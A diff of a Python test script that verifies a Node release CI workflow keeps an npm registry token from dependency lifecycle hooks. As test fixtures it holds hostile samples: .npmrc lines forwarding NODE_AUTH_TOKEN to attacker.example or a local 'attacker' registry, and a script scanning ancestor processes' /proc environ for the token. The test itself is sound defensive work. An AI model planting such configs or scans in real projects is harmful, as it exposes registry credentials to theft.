@@ -1,12 +1,20 @@
 #!/usr/bin/env python3
+import base64
 from collections import Counter
+import hashlib
+import http.server
+import io
 import json
 import os
 from pathlib import Path
-import re
+import shlex
 import shutil
 import subprocess
+import tarfile
 import tempfile
+import threading
+import urllib.request
+
 import yaml
 
 
@@ -32,68 +40,108 @@ def run_workflow_step(script, env):
     )
 
 
+FAKE_REGISTRY = "https://npm.pkg.github.com"
+FAKE_DOWNLOAD = f"{FAKE_REGISTRY}/download/@verjson/fixture/1.0.0/0123abcd"
+FAKE_CONTENT = b"locked private package archive"
+
+
+def fake_npm_workspace(root, *, lock_packages=None, npm_version="11.19.1"):
+    """A workspace whose npm is a recorder that caches FAKE_CONTENT on `cache add`."""
+    runner_temp = root / "runner-temp"
+    runner_temp.mkdir()
+    wrapper_dir = root / "bin"
+    wrapper_dir.mkdir()
+    cache_dir = root / "npm-cache"
+    digest = hashlib.sha512(FAKE_CONTENT).hexdigest()
+    content = cache_dir / "_cacache/content-v2/sha512" / digest[:2] / digest[2:4] / digest[4:]
+    wrapper = wrapper_dir / "npm"
+    wrapper.write_text(
+        "#!/usr/bin/env bash\n"
+        "set -euo pipefail\n"
+        'if [[ -e "$GITHUB_WORKSPACE/.npmrc" || -L "$GITHUB_WORKSPACE/.npmrc" ]]; then config=present; else config=absent; fi\n'
+        'if [[ -n "${NODE_AUTH_TOKEN-}" ]]; then token=present; else token=absent; fi\n'
+        'printf "%s|%s|%s\\n" "$config" "$token" "$*" >>"$NPM_TRACE"\n'
+        'case "$*" in\n'
+        '  --version) printf "%s\\n" "$FAKE_NPM_VERSION" ;;\n'
+        '  "config get cache") printf "%s\\n" "$FAKE_NPM_CACHE" ;;\n'
+        '  "cache add "*)\n'
+        '    [[ "${NPM_EXIT_CODE:-0}" == 0 ]] || exit "$NPM_EXIT_CODE"\n'
+        '    mkdir -p "$(dirname "$FAKE_CONTENT_PATH")"\n'
+        '    printf %s "$FAKE_CONTENT_BYTES" >"$FAKE_CONTENT_PATH" ;;\n'
+        "  *) exit 97 ;;\n"
+        "esac\n"
+    )
+    wrapper.chmod(0o755)
+    if lock_packages is None:
+        lock_packages = {
+            "": {"name": "fixture", "version": "1.0.0"},
+            "node_modules/@verjson/fixture": {
+                "version": "1.0.0",
+                "resolved": FAKE_DOWNLOAD,
+                "integrity": integrity_of(FAKE_CONTENT),
+            },
+        }
+    (root / "package-lock.json").write_text(
+        json.dumps({"name": "fixture", "lockfileVersion": 3, "packages": lock_packages})
+    )
+    env = os.environ | {
+        "GITHUB_WORKSPACE": str(root),
+        "RUNNER_TEMP": str(runner_temp),
+        "NODE_AUTH_TOKEN": TOKEN,
+        "PRIVATE_PACKAGE_REGISTRY": FAKE_REGISTRY,
+        "NPM_TRACE": str(root / "npm-observation.log"),
+        "PATH": f"{wrapper_dir}{os.pathsep}{os.environ['PATH']}",
+        "FAKE_NPM_VERSION": npm_version,
+        "FAKE_NPM_CACHE": str(cache_dir),
+        "FAKE_CONTENT_PATH": str(content),
+        "FAKE_CONTENT_BYTES": FAKE_CONTENT.decode(),
+        "NPM_EXIT_CODE": "0",
+    }
+    return env, runner_temp
+
+
+def npm_trace_of(env):
+    trace = Path(env["NPM_TRACE"])
+    return trace.read_text(encoding="utf-8").splitlines() if trace.exists() else []
+
+
 def verify_project_npmrc_isolation(script):
     with tempfile.TemporaryDirectory(prefix="node-release-npmrc-isolation-") as temp:
         root = Path(temp)
-        runner_temp = root / "runner-temp"
-        runner_temp.mkdir()
-        wrapper_dir = root / "bin"
-        wrapper_dir.mkdir()
-        npm_trace = root / "npm-observation.log"
-        wrapper = wrapper_dir / "npm"
-        wrapper.write_text(
-            "#!/usr/bin/env bash\n"
-            "set -euo pipefail\n"
-            'if [[ -e "$GITHUB_WORKSPACE/.npmrc" || -L "$GITHUB_WORKSPACE/.npmrc" ]]; then config=present; else config=absent; fi\n'
-            'if [[ -n "${NODE_AUTH_TOKEN-}" ]]; then token=present; else token=absent; fi\n'
-            'printf "%s|%s|%s\\n" "$config" "$token" "$*" >>"$NPM_TRACE"\n'
-            'exit "${NPM_EXIT_CODE:-0}"\n'
-        )
-        wrapper.chmod(0o755)
+        env, runner_temp = fake_npm_workspace(root)
         project_npmrc = root / ".npmrc"
         malicious_config = (
             "registry=https://attacker.example/\n"
             "//attacker.example/:_authToken=${NODE_AUTH_TOKEN}\n"
         )
         project_npmrc.write_text(malicious_config, encoding="utf-8")
-        env = os.environ.copy()
-        env.update({
-            "GITHUB_WORKSPACE": str(root),
-            "RUNNER_TEMP": str(runner_temp),
-            "GITHUB_OUTPUT": str(root / "github-output"),
-            "GITHUB_STEP_SUMMARY": str(root / "step-summary"),
-            "NODE_AUTH_TOKEN": "synthetic-package-token",
-            "NPM_TRACE": str(npm_trace),
-            "PATH": f"{wrapper_dir}{os.pathsep}{env['PATH']}",
-            "NPM_EXIT_CODE": "0",
-        })
-
-        result = run_workflow_step(script, env)
-        assert result.returncode == 0, result.stderr
-        assert npm_trace.read_text(encoding="utf-8").splitlines() == [
-            "absent|present|ci --ignore-scripts",
+        expected_trace = [
+            "absent|present|--version",
+            "absent|present|config get cache",
+            f"absent|present|cache add {FAKE_DOWNLOAD}",
         ]
-        assert project_npmrc.read_text(encoding="utf-8") == malicious_config
-        assert not list(runner_temp.glob("verjson-npmrc-isolation.*"))
 
-        npm_trace.unlink()
+        result = run_step(script, cwd=root, env=env)
+        assert result.returncode == 0, result.stdout + result.stderr
+        assert npm_trace_of(env) == expected_trace
+        assert project_npmrc.read_text(encoding="utf-8") == malicious_config
+        assert not list(runner_temp.iterdir())
+
+        Path(env["NPM_TRACE"]).unlink()
         env["NPM_EXIT_CODE"] = "23"
-        result = run_workflow_step(script, env)
-        assert result.returncode == 23, result.stderr
-        assert npm_trace.read_text(encoding="utf-8").splitlines() == [
-            "absent|present|ci --ignore-scripts",
-        ]
+        result = run_step(script, cwd=root, env=env)
+        assert result.returncode == 23, result.stdout + result.stderr
+        assert npm_trace_of(env) == expected_trace
         assert project_npmrc.read_text(encoding="utf-8") == malicious_config
-        assert not list(runner_temp.glob("verjson-npmrc-isolation.*"))
+        assert not list(runner_temp.iterdir())
 
-        npm_trace.unlink()
+        Path(env["NPM_TRACE"]).unlink()
         project_npmrc.unlink()
         env["NPM_EXIT_CODE"] = "0"
-        result = run_workflow_step(script, env)
-        assert result.returncode == 0, result.stderr
-        assert npm_trace.read_text(encoding="utf-8").splitlines() == [
-            "absent|present|ci --ignore-scripts",
-        ]
+        result = run_step(script, cwd=root, env=env)
+        assert result.returncode == 0, result.stdout + result.stderr
+        assert npm_trace_of(env) == expected_trace
+        assert not project_npmrc.exists()
 
 
 def verify_npm_cache_policy(script):
@@ -204,25 +252,31 @@ def main():
         assert isinstance(runner_guard_command, str)
         assert '"$RUNNER_ENVIRONMENT" != "github-hosted"' in runner_guard_command
         runner_guard_commands[job_name] = runner_guard_command
-    install_step = re.search(
-        r"(?ms)^      - name: Install dependencies\n(?P<step>.*?)(?=^      - name: |\Z)",
-        workflow,
+    acquisition_step = next(
+        step for step in prepare_job["steps"] if step.get("name") == ACQUISITION_STEP
     )
-    lifecycle_step = re.search(
-        r"(?ms)^      - name: Run dependency lifecycle scripts without credentials\n(?P<step>.*?)(?=^      - name: |\Z)",
-        workflow,
+    install_step = next(
+        step for step in prepare_job["steps"] if step.get("name") == TOKENLESS_INSTALL_STEP
     )
-    assert install_step, "node-release workflow is missing its dependency acquisition step"
-    assert lifecycle_step, "node-release workflow is missing its tokenless lifecycle step"
-    assert "npm ci --ignore-scripts" in install_step["step"]
-    assert "NODE_AUTH_TOKEN: ${{ secrets.NODE_AUTH_TOKEN }}" in install_step["step"]
-    assert "run: npm ci --prefer-offline" in lifecycle_step["step"]
-    assert "NODE_AUTH_TOKEN" not in lifecycle_step["step"]
-    workflow_install_step = next(
-        step for step in prepare_job["steps"] if step.get("name") == "Install dependencies"
+    setup_node_step = next(
+        step for step in prepare_job["steps"]
+        if str(step.get("uses", "")).startswith("actions/setup-node@")
     )
-    assert "npm ci --ignore-scripts" in workflow_install_step["run"]
-    verify_project_npmrc_isolation(workflow_install_step["run"])
+    assert acquisition_step.get("env") == {
+        "NODE_AUTH_TOKEN": "${{ secrets.NODE_AUTH_TOKEN }}",
+        "PRIVATE_PACKAGE_REGISTRY": setup_node_step["with"]["registry-url"],
+    }
+    assert setup_node_step["with"]["registry-url"] == "https://npm.pkg.github.com"
+    assert install_step.get("run", "").strip() == "npm ci --prefer-offline"
+    assert "env" not in install_step, "the dependency install must not receive credentials"
+    token_steps = [
+        step.get("name") for step in prepare_job["steps"]
+        if "${{ secrets.NODE_AUTH_TOKEN }}" in (step.get("env") or {}).values()
+    ]
+    assert token_steps == [ACQUISITION_STEP], token_steps
+    steps = prepare_job["steps"]
+    assert steps.index(acquisition_step) + 1 == steps.index(install_step)
+    verify_project_npmrc_isolation(acquisition_step["run"])
     cache_policy_step = next(
         step for step in prepare_job["steps"] if step.get("id") == "npm-cache-policy"
     )
@@ -234,242 +288,461 @@ def main():
     verify_npm_cache_policy(cache_policy_step["run"])
     verify_cache_namespace(prepare_job["steps"])
 
-    lifecycle_recorder = (
-        "const fs = require('node:fs');\n"
-        "const token = process.env.NODE_AUTH_TOKEN || '<unset>';\n"
-        "const tokenEnvKeys = Object.entries(process.env)\n"
-        "  .filter(([, value]) => typeof value === 'string' && value.includes('synthetic-package-token'))\n"
-        "  .map(([key]) => key);\n"
-        "const tokenAncestorPids = [];\n"
-        "let parentPid = process.ppid;\n"
-        "while (parentPid > 1) {\n"
-        "  let parentEnvironment;\n"
-        "  let parentStatus;\n"
-        "  try {\n"
-        "    parentEnvironment = fs.readFileSync(`/proc/${parentPid}/environ`, 'utf8').split('\\0');\n"
-        "    parentStatus = fs.readFileSync(`/proc/${parentPid}/status`, 'utf8');\n"
-        "  } catch { break; }\n"
-        "  if (parentEnvironment.includes('NODE_AUTH_TOKEN=synthetic-package-token')) tokenAncestorPids.push(parentPid);\n"
-        "  const parentPidMatch = parentStatus.match(/^PPid:\\s*(\\d+)/m);\n"
-        "  if (!parentPidMatch) break;\n"
-        "  parentPid = Number(parentPidMatch[1]);\n"
-        "}\n"
-        "fs.appendFileSync(process.env.LIFECYCLE_LOG, "
-        "`${process.env.npm_package_name}:${process.argv[2]}:${token}:${JSON.stringify(tokenEnvKeys)}:${JSON.stringify(tokenAncestorPids)}\\n`);\n"
-    )
-    root_scripts = {
-        hook: f"node record-lifecycle.cjs root-{hook}"
-        for hook in (
-            "preinstall",
-            "install",
-            "postinstall",
-            "prepublish",
-            "preprepare",
-            "prepare",
-            "postprepare",
-            "dependencies",
-        )
-    }
-    dependency_scripts = {
-        hook: f"node record-lifecycle.cjs dependency-{hook}"
-        for hook in ("preinstall", "install", "postinstall", "prepare")
-    }
+    runner_guards_reject_self_hosted(runner_guard_commands)
+    for major, (version, integrity) in sorted(SUPPORTED_NPM_RELEASES.items()):
+        with tempfile.TemporaryDirectory(prefix=f"node-release-npm{major}-") as temp:
+            root = Path(temp)
+            npm_bin = provision_npm(version, integrity, root / "npm")
+            verify_dependency_code_never_sees_credential(
+                npm_bin, version, acquisition_step["run"], install_step["run"], root,
+            )
+            verify_empty_dependency_tree(
+                npm_bin, version, acquisition_step["run"], install_step["run"], root,
+            )
 
-    with tempfile.TemporaryDirectory(prefix="node-release-credential-isolation-") as temp:
-        root = Path(temp)
+
+ACQUISITION_STEP = "Acquire private registry packages with credentials"
+TOKENLESS_INSTALL_STEP = "Install dependencies without credentials"
+TOKEN = "synthetic-package-token"
+
+# One exact npm per major that a Node line node-release accepts bundles: Node
+# 18, 20, and 22 ship npm 10 and Node 24, 25, and 26 ship npm 11. 10.9.9 is the
+# Node 22 npm on hosted ubuntu-24.04 where #1827 exposed the credential, and
+# 11.19.1 is the npm of node-release's default Node 24. Pinning the npm under
+# test, instead of using the runner's, keeps the verdict runner-independent.
+SUPPORTED_NPM_RELEASES = {
+    10: (
+        "10.9.9",
+        "sha512-1g+6jLQvaIuB4zwvHL7yrXuXcWZwDsCtBX8bbWDqbvJSSr9nPiDDWTHNgwXR27iIcTTW7v3A57hDW9RYv2W4Yg==",
+    ),
+    11: (
+        "11.19.1",
+        "sha512-ztsxKxt/kkIaAs+2i0GU6I+DRmUdrNasxTZKJe9TCdSjKxlhah/4r/hl5ygMD6XAg1qZ9c2TNomR4qgOydp10g==",
+    ),
+}
+
+LIFECYCLE_RECORDER = (
+    "const fs = require('node:fs');\n"
+    "const token = process.env.NODE_AUTH_TOKEN || '<unset>';\n"
+    "const tokenEnvKeys = Object.entries(process.env)\n"
+    "  .filter(([, value]) => typeof value === 'string' && value.includes('synthetic-package-token'))\n"
+    "  .map(([key]) => key);\n"
+    "const tokenAncestorPids = [];\n"
+    "let parentPid = process.ppid;\n"
+    "while (parentPid > 1) {\n"
+    "  let parentEnvironment;\n"
+    "  let parentStatus;\n"
+    "  try {\n"
+    "    parentEnvironment = fs.readFileSync(`/proc/${parentPid}/environ`, 'utf8').split('\\0');\n"
+    "    parentStatus = fs.readFileSync(`/proc/${parentPid}/status`, 'utf8');\n"
+    "  } catch { break; }\n"
+    "  if (parentEnvironment.includes('NODE_AUTH_TOKEN=synthetic-package-token')) tokenAncestorPids.push(parentPid);\n"
+    "  const parentPidMatch = parentStatus.match(/^PPid:\\s*(\\d+)/m);\n"
+    "  if (!parentPidMatch) break;\n"
+    "  parentPid = Number(parentPidMatch[1]);\n"
+    "}\n"
+    "fs.appendFileSync(process.env.LIFECYCLE_LOG, "
+    "`${process.env.npm_package_name}:${process.argv[2]}:${token}:${JSON.stringify(tokenEnvKeys)}:${JSON.stringify(tokenAncestorPids)}\\n`);\n"
+)
+ROOT_SCRIPTS = {
+    hook: f"node record-lifecycle.cjs root-{hook}"
+    for hook in (
+        "preinstall",
+        "install",
+        "postinstall",
+        "prepublish",
+        "preprepare",
+        "prepare",
+        "postprepare",
+        "dependencies",
+    )
+}
+DEPENDENCY_SCRIPTS = {
+    hook: f"node record-lifecycle.cjs dependency-{hook}"
+    for hook in ("preinstall", "install", "postinstall", "prepare")
+}
+
+
+def runner_guards_reject_self_hosted(runner_guard_commands):
+    with tempfile.TemporaryDirectory(prefix="node-release-runner-guard-") as temp:
         for job_name, runner_guard_command in runner_guard_commands.items():
-            hosted_runner_env = os.environ.copy()
-            hosted_runner_env["RUNNER_ENVIRONMENT"] = "github-hosted"
-            hosted_runner = subprocess.run(
+            hosted = subprocess.run(
                 ["bash", "-c", runner_guard_command],
-                cwd=root,
-                env=hosted_runner_env,
+                cwd=temp,
+                env=os.environ | {"RUNNER_ENVIRONMENT": "github-hosted"},
                 text=True,
                 capture_output=True,
             )
-            assert hosted_runner.returncode == 0, f"{job_name}: {hosted_runner.stderr}"
-            self_hosted_env = os.environ.copy()
-            self_hosted_env["RUNNER_ENVIRONMENT"] = "self-hosted"
+            assert hosted.returncode == 0, f"{job_name}: {hosted.stderr}"
             self_hosted = subprocess.run(
                 ["bash", "-c", runner_guard_command],
-                cwd=root,
-                env=self_hosted_env,
+                cwd=temp,
+                env=os.environ | {"RUNNER_ENVIRONMENT": "self-hosted"},
                 text=True,
                 capture_output=True,
             )
             assert self_hosted.returncode != 0, f"{job_name}: runner guard accepted self-hosted"
             assert "requires a fresh GitHub-hosted runner" in self_hosted.stdout
 
-        write_package(
-            root / "fixture-transitive-dependency",
-            {
-                "name": "fixture-transitive-dependency",
-                "version": "1.0.0",
-                "scripts": dependency_scripts,
-            },
-            lifecycle_recorder,
-        )
-        write_package(
-            root / "fixture-dependency",
-            {
-                "name": "fixture-dependency",
-                "version": "1.0.0",
-                "scripts": dependency_scripts,
-                "dependencies": {
-                    "fixture-transitive-dependency": "file:../fixture-transitive-dependency"
+
+def provision_npm(version, integrity, destination):
+    """Install one exact, integrity-checked npm release and return its bin directory."""
+    url = f"https://registry.npmjs.org/npm/-/npm-{version}.tgz"
+    with urllib.request.urlopen(url, timeout=120) as response:
+        archive = response.read()
+    digest = "sha512-" + base64.b64encode(hashlib.sha512(archive).digest()).decode()
+    assert digest == integrity, f"npm {version} archive does not match its pinned integrity"
+    destination.mkdir(parents=True)
+    with tarfile.open(fileobj=io.BytesIO(archive), mode="r:gz") as tar:
+        tar.extractall(destination, filter="data")
+    bin_dir = destination / "bin"
+    bin_dir.mkdir()
+    npm = bin_dir / "npm"
+    npm.write_text(
+        "#!/usr/bin/env bash\n"
+        f"exec node {shlex.quote(str(destination / 'package/bin/npm-cli.js'))} \"$@\"\n"
+    )
+    npm.chmod(0o755)
+    reported = subprocess.run(
+        [str(npm), "--version"], text=True, capture_output=True, check=True,
+    ).stdout.strip()
+    assert reported == version, f"provisioned npm reports {reported}, expected {version}"
+    return bin_dir
+
+
+def package_tarball(manifest, files):
+    buffer = io.BytesIO()
+    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
+        for name, content in {"package.json": json.dumps(manifest), **files}.items():
+            data = content.encode()
+            info = tarfile.TarInfo(f"package/{name}")
+            info.size = len(data)
+            info.mode = 0o644
+            tar.addfile(info, io.BytesIO(data))
+    return buffer.getvalue()
+
+
+def integrity_of(data):
+    return "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()
+
+
+class FixtureRegistry:
+    """A local registry that records every request and its Authorization header."""
+
+    def __init__(self, *, require_token):
+        self.routes = {}
+        self.requests = []
+        registry = self
+
+        class Handler(http.server.BaseHTTPRequestHandler):
+            def do_GET(self):
+                authorization = self.headers.get("Authorization")
+                registry.requests.append((self.path, authorization))
+                if require_token and authorization != f"Bearer {TOKEN}":
+                    self.send_response(401)
+                    self.end_headers()
+                    return
+                body = registry.routes.get(self.path)
+                if body is None:
+                    self.send_response(404)
+                    self.end_headers()
+                    return
+                self.send_response(200)
+                self.send_header("Content-Length", str(len(body)))
+                self.end_headers()
+                self.wfile.write(body)
+
+            def log_message(self, *args):
+                pass
+
+        self.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
+        self.origin = f"http://127.0.0.1:{self.server.server_address[1]}"
+        threading.Thread(target=self.server.serve_forever, daemon=True).start()
+
+    def publish(self, manifest, tarball, tarball_path):
+        name, version = manifest["name"], manifest["version"]
+        self.routes[tarball_path] = tarball
+        packument = json.dumps({
+            "name": name,
+            "dist-tags": {"latest": version},
+            "versions": {
+                version: {
+                    **manifest,
+                    "dist": {
+                        "tarball": f"{self.origin}{tarball_path}",
+                        "integrity": integrity_of(tarball),
+                    },
                 },
             },
-            lifecycle_recorder,
-        )
-        write_package(
-            root,
-            {
-                "name": "credential-isolation-fixture",
-                "version": "1.0.0",
-                "allowScripts": {
-                    "file:./fixture-dependency": True,
-                    "file:../fixture-transitive-dependency": True,
-                },
-                "scripts": root_scripts,
-                "dependencies": {"fixture-dependency": "file:./fixture-dependency"},
+        }).encode()
+        encoded = name.replace("/", "%2f")
+        for path in {f"/{name}", f"/{encoded}", f"/{name.replace('/', '%2F')}"}:
+            self.routes[path] = packument
+
+    def close(self):
+        self.server.shutdown()
+        self.server.server_close()
+
+
+def npm_environment(root, npm_bin, private_registry, label):
+    user_config = root / f"{label}-user.npmrc"
+    global_config = root / f"{label}-global.npmrc"
+    # Mirrors the user config actions/setup-node writes for registry-url + scope.
+    # It leaves the default registry alone, as setup-node does: npm exports a
+    # non-default registry to child processes, where it would outrank a git
+    # dependency's own .npmrc and hide that dependency's exfiltration path.
+    user_config.write_text(
+        f"@fixture:registry={private_registry.origin}/\n"
+        f"//{private_registry.origin.removeprefix('http://')}/:_authToken=${{NODE_AUTH_TOKEN}}\n"
+    )
+    global_config.write_text("")
+    return os.environ | {
+        "PATH": f"{npm_bin}{os.pathsep}{os.environ['PATH']}",
+        "NPM_CONFIG_USERCONFIG": str(user_config),
+        "NPM_CONFIG_GLOBALCONFIG": str(global_config),
+        "npm_config_cache": str(root / f"{label}-npm-cache"),
+        "npm_config_fetch_retries": "0",
+        "npm_config_audit": "false",
+        "npm_config_fund": "false",
+        "npm_config_update_notifier": "false",
+        "GIT_CONFIG_NOSYSTEM": "1",
+        "LIFECYCLE_LOG": str(root / f"{label}-lifecycle.log"),
+    }
+
+
+def write_dependency_fixture(root, private_registry, attacker_registry):
+    """Build file:, git, and private-registry dependencies that all run lifecycle hooks."""
+    project = root / "project"
+    write_package(
+        project / "fixture-transitive-dependency",
+        {"name": "fixture-transitive-dependency", "version": "1.0.0", "scripts": DEPENDENCY_SCRIPTS},
+        LIFECYCLE_RECORDER,
+    )
+    write_package(
+        project / "fixture-dependency",
+        {
+            "name": "fixture-dependency",
+            "version": "1.0.0",
+            "scripts": DEPENDENCY_SCRIPTS,
+            "dependencies": {"fixture-transitive-dependency": "file:../fixture-transitive-dependency"},
+        },
+        LIFECYCLE_RECORDER,
+    )
+
+    bait = {"name": "bait", "version": "1.0.0"}
+    attacker_registry.publish(bait, package_tarball(bait, {}), "/bait/-/bait-1.0.0.tgz")
+    git_dependency = root / "git-dependency"
+    write_package(
+        git_dependency,
+        {
+            "name": "git-dependency",
+            "version": "1.0.0",
+            "scripts": DEPENDENCY_SCRIPTS,
+            "devDependencies": {"bait": "1.0.0"},
+        },
+        LIFECYCLE_RECORDER,
+    )
+    # A dependency-controlled config that would forward the token to its own
+    # registry if npm prepared this git dependency while the token is present.
+    (git_dependency / ".npmrc").write_text(
+        f"registry={attacker_registry.origin}/\n"
+        f"//{attacker_registry.origin.removeprefix('http://')}/:_authToken=${{NODE_AUTH_TOKEN}}\n"
+    )
+    git = ["git", "-c", "user.name=fixture", "-c", "user.email=fixture@example.invalid"]
+    for command in (["init", "-q", "-b", "main"], ["add", "-A"], ["commit", "-qm", "fixture"]):
+        subprocess.run(git + command, cwd=git_dependency, check=True, capture_output=True)
+
+    private_manifest = {
+        "name": "@fixture/private-dependency",
+        "version": "1.0.0",
+        "scripts": {
+            hook: f"node record-lifecycle.cjs dependency-{hook}"
+            for hook in ("preinstall", "install", "postinstall")
+        },
+    }
+    private_tarball = package_tarball(private_manifest, {"record-lifecycle.cjs": LIFECYCLE_RECORDER})
+    download_path = (
+        "/download/@fixture/private-dependency/1.0.0/"
+        + hashlib.sha256(private_tarball).hexdigest()
+    )
+    private_registry.publish(
+        private_manifest | {"hasInstallScript": True}, private_tarball, download_path,
+    )
+
+    git_spec = f"git+file://{git_dependency}"
+    write_package(
+        project,
+        {
+            "name": "credential-isolation-fixture",
+            "version": "1.0.0",
+            "allowScripts": {
+                "file:./fixture-dependency": True,
+                "file:../fixture-transitive-dependency": True,
+                git_spec: True,
+                "@fixture/private-dependency": True,
             },
-            lifecycle_recorder,
-        )
-        (root / ".npmrc").write_text(
-            "//registry.npmjs.org/:_authToken=${NODE_AUTH_TOKEN}\n"
-        )
+            "scripts": ROOT_SCRIPTS,
+            "dependencies": {
+                "fixture-dependency": "file:./fixture-dependency",
+                "git-dependency": git_spec,
+                "@fixture/private-dependency": "1.0.0",
+            },
+        },
+        LIFECYCLE_RECORDER,
+    )
+    return project, download_path
 
-        env = os.environ.copy()
-        lifecycle_log = root / "lifecycle.log"
-        env.update(
-            {
-                "NODE_AUTH_TOKEN": "synthetic-package-token",
-                "LIFECYCLE_LOG": str(lifecycle_log),
-                "npm_config_cache": str(root / "npm-cache"),
-                "npm_config_offline": "true",
-                "npm_config_audit": "false",
-                "npm_config_fund": "false",
-                "NPM_CONFIG_USERCONFIG": str(root / "user.npmrc"),
-                "NPM_CONFIG_GLOBALCONFIG": str(root / "global.npmrc"),
-            }
-        )
-        (root / "user.npmrc").write_text("")
-        (root / "global.npmrc").write_text("")
-        npm_major = int(run(["npm", "--version"], cwd=root, env=env).split(".", 1)[0])
 
+def run_step(script, *, cwd, env):
+    """Run a workflow `run:` body the way GitHub Actions runs a bash step."""
+    return subprocess.run(
+        ["bash", "--noprofile", "--norc", "-eo", "pipefail", "-c", script],
+        cwd=cwd, env=env, text=True, capture_output=True,
+    )
+
+
+def with_npm_trace(env, root):
+    """Put a recorder in front of npm that logs each invocation and token presence."""
+    wrapper_dir = root / "npm-trace-bin"
+    wrapper_dir.mkdir(exist_ok=True)
+    wrapper = wrapper_dir / "npm"
+    wrapper.write_text(
+        "#!/usr/bin/env bash\n"
+        "set -euo pipefail\n"
+        'if [[ -n "${NODE_AUTH_TOKEN-}" ]]; then credential=present; else credential=absent; fi\n'
+        "printf '%s|%s\\n' \"$*\" \"$credential\" >> \"$NPM_TRACE\"\n"
+        "exec \"$REAL_NPM\" \"$@\"\n"
+    )
+    wrapper.chmod(0o755)
+    real_npm = shutil.which("npm", path=env["PATH"])
+    assert real_npm, "the provisioned npm is not on PATH"
+    return env | {
+        "PATH": f"{wrapper_dir}{os.pathsep}{env['PATH']}",
+        "REAL_NPM": real_npm,
+        "NPM_TRACE": str(root / "npm-trace.log"),
+    }
+
+
+def hooks_by_package(hook_records):
+    hooks = {}
+    for record in hook_records:
+        package_name, hook = record.split(":", 2)[:2]
+        hooks.setdefault(package_name, []).append(hook)
+    return hooks
+
+
+def verify_dependency_code_never_sees_credential(npm_bin, version, acquisition, install, root):
+    private_registry = FixtureRegistry(require_token=True)
+    attacker_registry = FixtureRegistry(require_token=False)
+    try:
+        project, download_path = write_dependency_fixture(root, private_registry, attacker_registry)
+        setup_env = npm_environment(root, npm_bin, private_registry, "setup")
         run(
-            [
-                "npm",
-                "install",
-                "--package-lock-only",
-                "--ignore-scripts",
-                "--offline",
-                "--no-audit",
-                "--no-fund",
-            ],
-            cwd=root,
-            env=env,
+            ["npm", "install", "--package-lock-only", "--ignore-scripts", "--no-audit", "--no-fund"],
+            cwd=project,
+            env=setup_env | {"NODE_AUTH_TOKEN": TOKEN},
         )
-        real_npm = shutil.which("npm")
-        assert real_npm, "npm must be available for the credential-isolation fixture"
-        wrapper_dir = root / "npm-wrapper"
-        wrapper_dir.mkdir()
-        npm_wrapper = wrapper_dir / "npm"
-        npm_wrapper.write_text(
-            "#!/usr/bin/env bash\n"
-            "set -euo pipefail\n"
-            'if [[ -n "${NODE_AUTH_TOKEN-}" ]]; then credential=present; else credential=absent; fi\n'
-            "printf '%s|%s\\n' \"$*\" \"$credential\" >> \"$NPM_TRACE\"\n"
-            "exec \"$REAL_NPM\" \"$@\"\n"
+        baseline = root / "baseline"
+        shutil.copytree(project, baseline)
+        # A repository-controlled config that would forward the token if the
+        # credentialed step read it.
+        (project / ".npmrc").write_text(
+            f"registry={attacker_registry.origin}/\n"
+            f"//{attacker_registry.origin.removeprefix('http://')}/:_authToken=${{NODE_AUTH_TOKEN}}\n"
         )
-        npm_wrapper.chmod(0o755)
-        npm_trace = root / "npm-commands.log"
-        helper_env = env | {
-            "PATH": f"{wrapper_dir}{os.pathsep}{env['PATH']}",
-            "REAL_NPM": real_npm,
-            "NPM_TRACE": str(npm_trace),
+
+        runner_temp = root / "runner-temp"
+        runner_temp.mkdir()
+        step_env = with_npm_trace(npm_environment(root, npm_bin, private_registry, "release"), root) | {
+            "GITHUB_WORKSPACE": str(project),
+            "RUNNER_TEMP": str(runner_temp),
+            "PRIVATE_PACKAGE_REGISTRY": private_registry.origin,
         }
-        run(["npm", "ci", "--ignore-scripts"], cwd=root, env=helper_env)
-        lifecycle_env = helper_env.copy()
-        lifecycle_env["NODE_AUTH_TOKEN"] = ""
-        run(["npm", "ci", "--prefer-offline"], cwd=root, env=lifecycle_env)
-        assert npm_trace.read_text().splitlines() == [
-            "ci --ignore-scripts|present",
-            "ci --prefer-offline|absent",
+        private_registry.requests.clear()
+        attacker_registry.requests.clear()
+        acquired = run_step(acquisition, cwd=project, env=step_env | {"NODE_AUTH_TOKEN": TOKEN})
+        assert acquired.returncode == 0, f"npm {version}: {acquired.stdout}{acquired.stderr}"
+        acquisition_requests = list(private_registry.requests)
+        private_registry.requests.clear()
+        installed = run_step(install, cwd=project, env=step_env | {"NODE_AUTH_TOKEN": ""})
+        assert installed.returncode == 0, f"npm {version}: {installed.stdout}{installed.stderr}"
+
+        records = Path(step_env["LIFECYCLE_LOG"]).read_text().splitlines()
+        exposed = [record for record in records if not record.endswith(":<unset>:[]:[]")]
+        assert not exposed, f"npm {version}: dependency code observed the credential: {exposed}"
+        attacker_token_requests = [
+            path for path, authorization in attacker_registry.requests if authorization
+            and TOKEN in authorization
         ]
-
-        records = lifecycle_log.read_text().splitlines()
-        assert all(record.endswith(":<unset>:[]:[]") for record in records), records
-
-        baseline_root = root / "npm-ci-baseline"
-        for package_name in ("fixture-transitive-dependency", "fixture-dependency"):
-            package_dir = root / package_name
-            write_package(
-                baseline_root / package_name,
-                json.loads((package_dir / "package.json").read_text()),
-                lifecycle_recorder,
-            )
-        write_package(
-            baseline_root,
-            json.loads((root / "package.json").read_text()),
-            lifecycle_recorder,
+        assert not attacker_token_requests, (
+            f"npm {version}: a dependency-controlled registry received the credential: "
+            f"{attacker_token_requests}"
         )
-        (baseline_root / ".npmrc").write_text(
-            "//registry.npmjs.org/:_authToken=${NODE_AUTH_TOKEN}\n"
+        assert acquisition_requests and all(
+            request == (download_path, f"Bearer {TOKEN}") for request in acquisition_requests
+        ), f"npm {version}: the credential was used for more than the locked download: {acquisition_requests}"
+        assert private_registry.requests == [], (
+            f"npm {version}: the tokenless install contacted the private registry: "
+            f"{private_registry.requests}"
         )
-        baseline_env = env | {
-            "LIFECYCLE_LOG": str(root / "baseline-lifecycle.log"),
-            "npm_config_cache": str(root / "baseline-npm-cache"),
-        }
+        assert (project / "node_modules/@fixture/private-dependency/package.json").is_file()
+        assert runner_temp.exists() and not list(runner_temp.iterdir()), list(runner_temp.iterdir())
+        trace = Path(step_env["NPM_TRACE"]).read_text().splitlines()
+        credentialed = [line.rsplit("|", 1)[0] for line in trace if line.endswith("|present")]
+        assert f"cache add {private_registry.origin}{download_path}" in credentialed, trace
